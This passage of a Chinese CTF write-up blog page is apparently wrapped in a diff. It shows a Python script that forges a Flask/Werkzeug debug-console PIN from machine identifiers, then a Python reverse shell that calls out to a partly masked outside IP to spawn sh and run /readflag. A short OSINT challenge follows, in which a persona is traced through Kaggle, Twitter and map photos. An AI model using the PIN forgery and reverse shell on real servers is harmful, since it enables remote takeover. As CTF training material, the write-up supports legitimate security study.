+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="c1">#sha1</span>
+<span class="kn">import</span> <span class="nn">hashlib</span>
+<span class="kn">from</span> <span class="nn">itertools</span> <span class="kn">import</span> <span class="n">chain</span>
+<span class="n">probably_public_bits</span> <span class="o">=</span> <span class="p">[</span>
+    <span class="s1">&#39;ctf&#39;</span><span class="c1"># /etc/passwd</span>
+    <span class="s1">&#39;flask.app&#39;</span><span class="p">,</span><span class="c1"># 默认值</span>
+    <span class="s1">&#39;Flask&#39;</span><span class="p">,</span><span class="c1"># 默认值</span>
+    <span class="s1">&#39;/usr/local/lib/python3.8/site-packages/flask/app.py&#39;</span> <span class="c1"># 报错得到</span>
+<span class="p">]</span>
+
+<span class="n">private_bits</span> <span class="o">=</span> <span class="p">[</span>
+    <span class="s1">&#39;xxx&#39;</span><span class="p">,</span><span class="c1">#  /sys/class/net/eth0/address 16进制转10进制</span>
+    <span class="s1">&#39;xxxxxx&#39;</span><span class="c1">#  /etc/machine-id+/proc/self/cgroup</span>
+<span class="p">]</span>
+
+<span class="n">h</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha1</span><span class="p">()</span>
+<span class="k">for</span> <span class="n">bit</span> <span class="ow">in</span> <span class="n">chain</span><span class="p">(</span><span class="n">probably_public_bits</span><span class="p">,</span> <span class="n">private_bits</span><span class="p">):</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">bit</span><span class="p">:</span>
+        <span class="k">continue</span>
+    <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">bit</span><span class="p">,</span> <span class="nb">str</span><span class="p">):</span>
+        <span class="n">bit</span> <span class="o">=</span> <span class="n">bit</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
+    <span class="n">h</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">bit</span><span class="p">)</span>
+<span class="n">h</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;cookiesalt&#39;</span><span class="p">)</span>
+
+<span class="n">cookie_name</span> <span class="o">=</span> <span class="s1">&#39;__wzd&#39;</span> <span class="o">+</span> <span class="n">h</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()[:</span><span class="mi">20</span><span class="p">]</span>
+
+<span class="n">num</span> <span class="o">=</span> <span class="kc">None</span>
+<span class="k">if</span> <span class="n">num</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+    <span class="n">h</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;pinsalt&#39;</span><span class="p">)</span>
+    <span class="n">num</span> <span class="o">=</span> <span class="p">(</span><span class="s1">&#39;</span><span class="si">%09d</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="nb">int</span><span class="p">(</span><span class="n">h</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">(),</span> <span class="mi">16</span><span class="p">))[:</span><span class="mi">9</span><span class="p">]</span>
+
+<span class="n">rv</span> <span class="o">=</span><span class="kc">None</span>
+<span class="k">if</span> <span class="n">rv</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+    <span class="k">for</span> <span class="n">group_size</span> <span class="ow">in</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">3</span><span class="p">:</span>
+        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">num</span><span class="p">)</span> <span class="o">%</span> <span class="n">group_size</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+            <span class="n">rv</span> <span class="o">=</span> <span class="s1">&#39;-&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">num</span><span class="p">[</span><span class="n">x</span><span class="p">:</span><span class="n">x</span> <span class="o">+</span> <span class="n">group_size</span><span class="p">]</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="n">group_size</span><span class="p">,</span> <span class="s1">&#39;0&#39;</span><span class="p">)</span>
+                          <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">num</span><span class="p">),</span> <span class="n">group_size</span><span class="p">))</span>
+            <span class="k">break</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">rv</span> <span class="o">=</span> <span class="n">num</span>
+
+<span class="nb">print</span><span class="p">(</span><span class="n">rv</span><span class="p">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>587-976-623
+进去console用python反弹shell，到根目录执行/readflag</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">import</span> <span class="nn">os</span><span class="o">,</span><span class="n">pty</span><span class="o">,</span><span class="n">socket</span>
+<span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="na">socket</span><span class="o">()</span>
+<span class="n">s</span><span class="o">.</span><span class="na">connect</span><span class="o">((</span><span class="s">&#34;101.35.***&#34;</span><span class="o">,</span><span class="n">8866</span><span class="o">))</span>
+<span class="o">[</span><span class="n">os</span><span class="o">.</span><span class="na">dup2</span><span class="o">(</span><span class="n">s</span><span class="o">.</span><span class="na">fileno</span><span class="o">(),</span><span class="n">f</span><span class="o">)</span><span class="k">for</span> <span class="n">f</span> <span class="nf">in</span><span class="o">(</span><span class="n">0</span><span class="o">,</span><span class="n">1</span><span class="o">,</span><span class="n">2</span><span class="o">)];</span><span class="n">pty</span><span class="o">.</span><span class="na">spawn</span><span class="o">(</span><span class="s">&#34;sh&#34;</span><span class="o">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img-blog.csdnimg.cn/93964d8831cd4f9f9169e3296b24c020.png"
+        data-srcset="https://img-blog.csdnimg.cn/93964d8831cd4f9f9169e3296b24c020.png, https://img-blog.csdnimg.cn/93964d8831cd4f9f9169e3296b24c020.png 1.5x, https://img-blog.csdnimg.cn/93964d8831cd4f9f9169e3296b24c020.png 2x"
+        data-sizes="auto"
+        alt="https://img-blog.csdnimg.cn/93964d8831cd4f9f9169e3296b24c020.png"
+        title="在这里插入图片描述" /></p>
+<h2 id="misc">Misc</h2>
+<h3 id="today">today</h3>
+<p>“I’m anninefour. I love machine learning and data science.
+Flag is in my pocket!”
+名字是anninefour，喜欢机器学习和数据科学，那么可以去各大机器学习平台社区搜搜这个人
+在kaggle里面找到了这个人
+<a href="https://www.kaggle.com/anninefour" target="_blank" rel="noopener noreffer">https://www.kaggle.com/anninefour</a>
+
+绑定了一个推特
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img-blog.csdnimg.cn/ed746eaf33a8444e87dc404b1e2e518b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_18,color_FFFFFF,t_70,g_se,x_16"
+        data-srcset="https://img-blog.csdnimg.cn/ed746eaf33a8444e87dc404b1e2e518b.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_18%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16, https://img-blog.csdnimg.cn/ed746eaf33a8444e87dc404b1e2e518b.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_18%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16 1.5x, https://img-blog.csdnimg.cn/ed746eaf33a8444e87dc404b1e2e518b.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_18%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16 2x"
+        data-sizes="auto"
+        alt="https://img-blog.csdnimg.cn/ed746eaf33a8444e87dc404b1e2e518b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_18,color_FFFFFF,t_70,g_se,x_16"
+        title="在这里插入图片描述" />
+到了一个图片
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img-blog.csdnimg.cn/ba4164e376a54f7db8e1fcea3b503993.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_18,color_FFFFFF,t_70,g_se,x_16"
+        data-srcset="https://img-blog.csdnimg.cn/ba4164e376a54f7db8e1fcea3b503993.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_18%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16, https://img-blog.csdnimg.cn/ba4164e376a54f7db8e1fcea3b503993.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_18%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16 1.5x, https://img-blog.csdnimg.cn/ba4164e376a54f7db8e1fcea3b503993.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_18%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16 2x"
+        data-sizes="auto"
+        alt="https://img-blog.csdnimg.cn/ba4164e376a54f7db8e1fcea3b503993.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_18,color_FFFFFF,t_70,g_se,x_16"
+        title="在这里插入图片描述" />
+看到对面有一个农夫果品生鲜超市
+去高德搜了一下，全称直接搜没搜到，搜一半农夫果品，发现集中在上海，貌似是上海连锁，而且图片能非常相似的对上
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img-blog.csdnimg.cn/b795de8e83794b70a225095a1eacac13.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16"
+        data-srcset="https://img-blog.csdnimg.cn/b795de8e83794b70a225095a1eacac13.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_20%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16, https://img-blog.csdnimg.cn/b795de8e83794b70a225095a1eacac13.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_20%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16 1.5x, https://img-blog.csdnimg.cn/b795de8e83794b70a225095a1eacac13.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_20%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16 2x"
+        data-sizes="auto"
+        alt="https://img-blog.csdnimg.cn/b795de8e83794b70a225095a1eacac13.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16"
+        title="在这里插入图片描述" />
+在上海区域搜农夫果品生鲜超市，只有一个能完全对应上名字
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img-blog.csdnimg.cn/23b9d1ded60e469c81fc875317dfb959.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_12,color_FFFFFF,t_70,g_se,x_16"
+        data-srcset="https://img-blog.csdnimg.cn/23b9d1ded60e469c81fc875317dfb959.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_12%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16, https://img-blog.csdnimg.cn/23b9d1ded60e469c81fc875317dfb959.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_12%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16 1.5x, https://img-blog.csdnimg.cn/23b9d1ded60e469c81fc875317dfb959.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_12%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16 2x"
+        data-sizes="auto"
+        alt="https://img-blog.csdnimg.cn/23b9d1ded60e469c81fc875317dfb959.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_12,color_FFFFFF,t_70,g_se,x_16"
+        title="在这里插入图片描述" />
+拍照的小区在对面，叫花山名苑
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img-blog.csdnimg.cn/e4fd407f9abf4f1c99be5ec8ff35ad04.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_17,color_FFFFFF,t_70,g_se,x_16"
+        data-srcset="https://img-blog.csdnimg.cn/e4fd407f9abf4f1c99be5ec8ff35ad04.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_17%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16, https://img-blog.csdnimg.cn/e4fd407f9abf4f1c99be5ec8ff35ad04.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_17%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16 1.5x, https://img-blog.csdnimg.cn/e4fd407f9abf4f1c99be5ec8ff35ad04.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_17%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16 2x"
+        data-sizes="auto"
+        alt="https://img-blog.csdnimg.cn/e4fd407f9abf4f1c99be5ec8ff35ad04.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_17,color_FFFFFF,t_70,g_se,x_16"
+        title="在这里插入图片描述" />
+在google地图评论里找到了flag</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img-blog.csdnimg.cn/e1caf1c92ab248c3bf2b29067d901bf9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_12,color_FFFFFF,t_70,g_se,x_16"
+        data-srcset="https://img-blog.csdnimg.cn/e1caf1c92ab248c3bf2b29067d901bf9.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_12%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16, https://img-blog.csdnimg.cn/e1caf1c92ab248c3bf2b29067d901bf9.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_12%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16 1.5x, https://img-blog.csdnimg.cn/e1caf1c92ab248c3bf2b29067d901bf9.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_12%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16 2x"
+        data-sizes="auto"
+        alt="https://img-blog.csdnimg.cn/e1caf1c92ab248c3bf2b29067d901bf9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_12,color_FFFFFF,t_70,g_se,x_16"
+        title="在这里插入图片描述" /></p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2022-04-17</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/java%E5%AE%89%E5%85%A8_%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/" class="prev" rel="prev" title="[Java安全]类加载器ClassLoader"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>[Java安全]类加载器ClassLoader</a>
+            <a href="/%E6%A0%A1%E8%B5%9B%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/" class="next" rel="next" title="校赛CTFd平台docker搭建—pixo主题">校赛CTFd平台docker搭建—pixo主题<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">2022</div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Huamang</a></span><span class="icp-splitter">&nbsp;|&nbsp;</span><br class="icp-br"/>
+                    <span class="icp">赣ICP备2021001334号</span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/algoliasearch@4.13.0/dist/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.1/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":50},"comment":{},"search":{"algoliaAppID":"PASDMWALPK","algoliaIndex":"index.zh-cn","algoliaSearchKey":"b42948e51daaa93df92381c8e2ac0f93","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
